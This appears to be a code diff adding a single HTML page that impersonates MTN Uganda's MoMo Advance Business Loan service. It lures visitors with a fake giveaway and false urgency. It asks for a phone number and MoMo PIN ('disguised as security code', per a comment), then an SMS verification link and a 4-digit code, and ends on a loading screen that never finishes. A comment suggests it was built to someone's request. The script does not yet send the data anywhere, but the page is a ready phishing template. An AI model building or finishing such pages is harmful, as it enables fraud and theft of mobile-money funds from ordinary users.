@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN UGANDA MoMo ADVANCE BUSINESS LOAN</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+        }
+        body {
+            background: linear-gradient(145deg, #0a1f2e 0%, #0d2b3e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        .card {
+            background: #ffffff;
+            max-width: 560px;
+            width: 100%;
+            border-radius: 32px;
+            padding: 28px 24px 32px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6), 0 0 0 2px rgba(255, 215, 0, 0.2);
+            transition: all 0.3s;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+        .mtn-brand {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .mtn-logo {
+            background: #ffcc00;
+            color: #000;
+            font-weight: 800;
+            font-size: 22px;
+            padding: 4px 12px;
+            border-radius: 40px;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 0 #b38f00;
+        }
+        .mtn-title {
+            font-weight: 700;
+            font-size: 1.3rem;
+            color: #0a1f2e;
+            background: #ffcc00;
+            padding: 4px 16px;
+            border-radius: 40px;
+            display: inline-block;
+        }
+        h2 {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: #0a1f2e;
+            text-align: center;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+        .subhead {
+            text-align: center;
+            color: #4b5f6b;
+            font-size: 0.95rem;
+            margin-bottom: 24px;
+            font-weight: 500;
+        }
+        .giveaway-badge {
+            background: #eef7e6;
+            border-left: 6px solid #2e7d32;
+            padding: 12px 16px;
+            border-radius: 16px;
+            margin-bottom: 22px;
+            font-weight: 600;
+            color: #1b5e20;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1.1rem;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        }
+        .giveaway-badge span {
+            background: #2e7d32;
+            color: white;
+            font-size: 0.8rem;
+            padding: 4px 12px;
+            border-radius: 40px;
+            letter-spacing: 0.5px;
+        }
+        .expiry-note {
+            background: #fff3e0;
+            color: #b85e00;
+            border-radius: 40px;
+            padding: 8px 16px;
+            font-weight: 700;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 24px;
+            border: 1px dashed #ff9800;
+            text-align: center;
+        }
+        .expiry-note i {
+            font-size: 1.2rem;
+        }
+        label {
+            font-weight: 600;
+            color: #1e3a4b;
+            font-size: 0.9rem;
+            display: block;
+            margin-bottom: 6px;
+        }
+        .country-row {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        select {
+            flex: 1;
+            padding: 16px 12px;
+            border-radius: 20px;
+            border: 2px solid #cbd5e1;
+            font-weight: 600;
+            background: #f8fafc;
+            font-size: 1rem;
+            color: #0a1f2e;
+            outline: none;
+            transition: 0.2s;
+            cursor: pointer;
+        }
+        select:focus {
+            border-color: #ffcc00;
+            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
+        }
+        .phone-input-wrapper {
+            display: flex;
+            align-items: center;
+            background: #f8fafc;
+            border-radius: 20px;
+            border: 2px solid #cbd5e1;
+            transition: 0.2s;
+            overflow: hidden;
+        }
+        .phone-input-wrapper:focus-within {
+            border-color: #ffcc00;
+            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
+        }
+        .prefix {
+            background: #e9eef3;
+            padding: 16px 14px;
+            font-weight: 700;
+            color: #1e3a4b;
+            font-size: 1rem;
+            white-space: nowrap;
+            border-right: 1px solid #cbd5e1;
+            min-width: 85px;
+            text-align: center;
+        }
+        .phone-input-wrapper input {
+            flex: 1;
+            padding: 16px 14px;
+            border: none;
+            background: transparent;
+            font-weight: 600;
+            font-size: 1rem;
+            outline: none;
+            color: #0a1f2e;
+        }
+        .pin-row {
+            display: flex;
+            gap: 16px;
+            margin: 20px 0 12px;
+            align-items: center;
+        }
+        .pin-row .pin-label {
+            font-weight: 700;
+            color: #1e3a4b;
+            white-space: nowrap;
+            background: #f1f5f9;
+            padding: 12px 16px;
+            border-radius: 40px;
+            font-size: 0.95rem;
+        }
+        .pin-row input {
+            flex: 1;
+            padding: 16px 16px;
+            border-radius: 20px;
+            border: 2px solid #cbd5e1;
+            font-weight: 600;
+            letter-spacing: 6px;
+            font-size: 1.2rem;
+            text-align: center;
+            background: #f8fafc;
+            outline: none;
+        }
+        .pin-row input:focus {
+            border-color: #ffcc00;
+            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
+        }
+        .info-note {
+            font-size: 0.85rem;
+            color: #64748b;
+            margin-top: 4px;
+            margin-bottom: 24px;
+            background: #f1f5f9;
+            padding: 12px 16px;
+            border-radius: 16px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        .btn {
+            background: #ffcc00;
+            border: none;
+            padding: 18px 20px;
+            width: 100%;
+            border-radius: 60px;
+            font-weight: 800;
+            font-size: 1.2rem;
+            color: #0a1f2e;
+            cursor: pointer;
+            box-shadow: 0 8px 0 #b38f00;
+            transition: all 0.1s ease;
+            letter-spacing: 0.5px;
+            margin-top: 10px;
+        }
+        .btn:active {
+            transform: translateY(4px);
+            box-shadow: 0 4px 0 #b38f00;
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            transform: translateY(4px);
+            box-shadow: 0 4px 0 #b38f00;
+            pointer-events: none;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .page {
+            transition: opacity 0.3s;
+        }
+        .link-verify-box {
+            background: #f0f9ff;
+            border-radius: 24px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 2px dashed #0284c7;
+        }
+        .link-verify-box input {
+            width: 100%;
+            padding: 16px;
+            border-radius: 20px;
+            border: 2px solid #b0c4de;
+            font-size: 1rem;
+            outline: none;
+            margin-top: 8px;
+        }
+        .code-box {
+            display: flex;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .code-box input {
+            flex: 1;
+            padding: 18px 12px;
+            border-radius: 20px;
+            border: 2px solid #cbd5e1;
+            font-size: 1.5rem;
+            text-align: center;
+            letter-spacing: 8px;
+            font-weight: 700;
+            background: #f8fafc;
+        }
+        .loader-text {
+            text-align: center;
+            font-size: 2rem;
+            font-weight: 800;
+            color: #ffcc00;
+            background: #0a1f2e;
+            padding: 24px;
+            border-radius: 40px;
+            letter-spacing: 4px;
+            animation: pulse 1.2s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.8; }
+            50% { opacity: 1; }
+            100% { opacity: 0.8; }
+        }
+        .loading-screen {
+            text-align: center;
+            padding: 40px 10px;
+        }
+        .loading-screen .loader-text {
+            font-size: 2.4rem;
+            background: #0a1f2e;
+            color: #ffcc00;
+            border-radius: 60px;
+            padding: 20px;
+            box-shadow: 0 0 0 4px rgba(255, 204, 0, 0.3);
+        }
+        .small-meta {
+            font-size: 0.75rem;
+            color: #94a3b8;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .flex-between {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .inline-icon {
+            font-size: 1.2rem;
+        }
+        .counter-badge {
+            background: #ffcc00;
+            border-radius: 40px;
+            padding: 2px 12px;
+            font-size: 0.8rem;
+            font-weight: 800;
+            color: #0a1f2e;
+        }
+    </style>
+</head>
+<body>
+    <div class="card" id="app">
+        <!-- ========== PAGE 1: LOGIN & COUNTRY ========== -->
+        <div id="page1" class="page">
+            <div class="mtn-brand">
+                <div class="mtn-logo">MTN</div>
+                <div class="mtn-title">UGANDA</div>
+            </div>
+            <h2>MoMo Advance Business Loan</h2>
+            <div class="subhead">Fast, secure & instant approval</div>
+
+            <!-- Giveaway highlight -->
+            <div class="giveaway-badge">
+                <span>🎁</span> MTN MOMO GIVEAWAY: 1,000,000 UGX
+            </div>
+            <div class="expiry-note">
+                <i>⏳</i> OFFER EXPIRES SOON — 86% claimed. Don’t be left behind!
+            </div>
+
+            <!-- country + phone -->
+            <label>🌍 Select country</label>
+            <div class="country-row">
+                <select id="countrySelect" aria-label="Country">
+                    <option value="" disabled selected>-- Select Country --</option>
+                    <option value="UGANDA">UGANDA 🇺🇬</option>
+                    <option value="ZAMBIA">ZAMBIA 🇿🇲</option>
+                </select>
+            </div>
+
+            <label>📱 MoMo Number</label>
+            <div class="phone-input-wrapper">
+                <span class="prefix" id="prefixDisplay">+256</span>
+                <input type="tel" id="phoneInput" placeholder="76 123 4567" maxlength="12" inputmode="numeric">
+            </div>
+            <div class="info-note">
+                <span>🔒</span> Use MoMo details for quick review & instant payout.
+            </div>
+
+            <!-- PIN (disguised as security code) -->
+            <div class="pin-row">
+                <span class="pin-label">🔑 PIN</span>
+                <input type="password" id="pinInput" placeholder="••••" maxlength="4" inputmode="numeric">
+            </div>
+            <div class="info-note" style="margin-bottom: 24px;">
+                <span>⚡</span> Your PIN is encrypted and never shared.
+            </div>
+
+            <!-- relevant question -->
+            <label>❓ How many people in your household?</label>
+            <select id="householdSelect" style="margin-bottom: 22px;">
+                <option value="1">1 – 2</option>
+                <option value="3">3 – 4</option>
+                <option value="5">5 – 6</option>
+                <option value="7">7+</option>
+            </select>
+
+            <button class="btn" id="submitPage1">SUBMIT APPLICATION →</button>
+            <div class="small-meta">🔒 Secure & encrypted. No registration fee.</div>
+        </div>
+
+        <!-- ========== PAGE 2: LINK VERIFICATION ========== -->
+        <div id="page2" class="page hidden">
+            <div class="mtn-brand">
+                <div class="mtn-logo">MTN</div>
+                <div class="mtn-title">UGANDA</div>
+            </div>
+            <h2>🔗 Verify Your Link</h2>
+            <div class="subhead">Paste the link you received via SMS</div>
+            <div class="link-verify-box">
+                <label>📩 Copy & paste the link</label>
+                <input type="url" id="linkInput" placeholder="https://mtn.co.ug/verify/...">
+            </div>
+            <button class="btn" id="submitLinkBtn">SUBMIT LINK →</button>
+        </div>
+
+        <!-- ========== PAGE 3: 4-DIGIT CODE ========== -->
+        <div id="page3" class="page hidden">
+            <div class="mtn-brand">
+                <div class="mtn-logo">MTN</div>
+                <div class="mtn-title">UGANDA</div>
+            </div>
+            <h2>🔐 Enter 4-digit code</h2>
+            <div class="subhead">Last step — verify your MoMo code</div>
+            <div class="code-box">
+                <input type="text" id="codeInput" placeholder="••••" maxlength="4" inputmode="numeric" autofocus>
+            </div>
+            <button class="btn" id="finishBtn">FINISH →</button>
+        </div>
+
+        <!-- ========== PAGE 4: LOADING SCREEN ========== -->
+        <div id="page4" class="page hidden">
+            <div class="loading-screen">
+                <div class="loader-text">LOADING...</div>
+                <div style="margin-top: 30px; font-weight: 500; color: #ffcc00;">Verifying your MoMo details</div>
+                <div style="margin-top: 40px; font-size: 0.9rem; color: #94a3b8;">Please don't close this window</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // ---------- DOM elements ----------
+            const page1 = document.getElementById('page1');
+            const page2 = document.getElementById('page2');
+            const page3 = document.getElementById('page3');
+            const page4 = document.getElementById('page4');
+
+            const countrySelect = document.getElementById('countrySelect');
+            const prefixDisplay = document.getElementById('prefixDisplay');
+            const phoneInput = document.getElementById('phoneInput');
+            const pinInput = document.getElementById('pinInput');
+            const householdSelect = document.getElementById('householdSelect');
+            const submitPage1 = document.getElementById('submitPage1');
+
+            const linkInput = document.getElementById('linkInput');
+            const submitLinkBtn = document.getElementById('submitLinkBtn');
+
+            const codeInput = document.getElementById('codeInput');
+            const finishBtn = document.getElementById('finishBtn');
+
+            // ---------- Country prefix logic ----------
+            countrySelect.addEventListener('change', function() {
+                const country = this.value;
+                if (country === 'UGANDA') {
+                    prefixDisplay.textContent = '+256';
+                    phoneInput.placeholder = '76 123 4567';
+                } else if (country === 'ZAMBIA') {
+                    prefixDisplay.textContent = '+260';
+                    phoneInput.placeholder = '97 123 4567';
+                } else {
+                    prefixDisplay.textContent = '+___';
+                    phoneInput.placeholder = 'phone number';
+                }
+            });
+
+            // ---------- Page 1 submit: validate & move to page 2 ----------
+            submitPage1.addEventListener('click', function(e) {
+                e.preventDefault();
+
+                const country = countrySelect.value;
+                const phone = phoneInput.value.trim();
+                const pin = pinInput.value.trim();
+                const household = householdSelect.value;
+
+                // basic validation
+                if (!country) {
+                    alert('Please select a country (UGANDA or ZAMBIA).');
+                    return;
+                }
+                if (!phone || phone.length < 6) {
+                    alert('Please enter a valid MoMo phone number.');
+                    return;
+                }
+                if (!pin || pin.length !== 4 || !/^\d{4}$/.test(pin)) {
+                    alert('Please enter a 4-digit PIN.');
+                    return;
+                }
+
+                // optional: check if phone is numeric only (after removing spaces)
+                const phoneDigits = phone.replace(/\s+/g, '');
+                if (!/^\d+$/.test(phoneDigits)) {
+                    alert('Phone number should contain only digits.');
+                    return;
+                }
+
+                // if all good, hide page1, show page2
+                page1.classList.add('hidden');
+                page2.classList.remove('hidden');
+                // prefill anything? no
+            });
+
+            // ---------- Page 2: link submit -> page3 ----------
+            submitLinkBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                const link = linkInput.value.trim();
+                if (!link) {
+                    alert('Please paste the verification link you received.');
+                    return;
+                }
+                // optionally validate URL format (loose)
+                if (!link.startsWith('http://') && !link.startsWith('https://')) {
+                    alert('Please enter a valid link starting with http:// or https://');
+                    return;
+                }
+                // move to page3
+                page2.classList.add('hidden');
+                page3.classList.remove('hidden');
+                // focus on code input
+                codeInput.focus();
+            });
+
+            // ---------- Page 3: finish button -> loading page ----------
+            finishBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                const code = codeInput.value.trim();
+                if (!code || code.length !== 4 || !/^\d{4}$/.test(code)) {
+                    alert('Please enter the 4-digit code you received.');
+                    return;
+                }
+                // move to loading page (page4)
+                page3.classList.add('hidden');
+                page4.classList.remove('hidden');
+                // Simulate loading forever (as requested: "it says loading..... Just loading")
+                // No further action — stays on loading screen.
+            });
+
+            // ---------- extra: restrict phone input to digits and spaces ----------
+            phoneInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^\d\s]/g, '');
+            });
+
+            // PIN input: only digits, max 4
+            pinInput.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '').slice(0, 4);
+            });
+
+            // code input: only digits, max 4
+            codeInput.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '').slice(0, 4);
+            });
+
+            // link input: no restriction besides basic
+            // initial state: page1 visible, others hidden
+        })();
+    </script>
+</body>
+</html>
